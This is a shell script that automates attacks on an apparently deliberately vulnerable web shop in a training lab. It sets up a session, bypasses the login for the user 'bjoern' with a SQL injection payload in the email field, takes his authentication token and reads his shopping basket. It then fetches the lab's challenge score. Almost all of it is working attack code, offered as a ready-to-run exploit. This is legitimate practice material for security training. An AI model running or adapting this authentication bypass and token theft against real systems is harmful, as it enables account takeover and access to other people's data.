#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.216.153"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Initiate session and cookies
echo "2.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L > /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/2-cookies.txt" -L
IO=$(grep io "$result_folder/2-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/2-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/2-cookies.txt

# Access another user basket
echo "2.9 - ACCESS ANOTHER USER BASKET"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/2-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@owasp.org'--\",\"password\":\"a\"}" -o $result_folder/2-bjoern.json
BJOERN_TOKEN=$(jq -r '.authentication.token' $result_folder/2-bjoern.json)
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/2-bjoern.json)
echo "--> Authenticated as bjoern with token ${BJOERN_TOKEN}"
cp $result_folder/2-cookies.txt $result_folder/2-bjoern-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$BJOERN_TOKEN" >> $result_folder/2-bjoern-cookies.txt
curl -s -X GET http://$target_ip/rest/basket/${BASKET_ID} -b "$result_folder/2-bjoern-cookies.txt" -H "Authorization: Bearer ${BJOERN_TOKEN}" -L -v -o $result_folder/2-basket.json
#node $scriptpath/../../tools/playwright.js "http://$target_ip/#/basket" $result_folder/2-bjoern-cookies.txt > $result_folder/2-basket.html

# Compute score
echo "2.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/2-cookies.txt" -L -o $result_folder/2-scores.json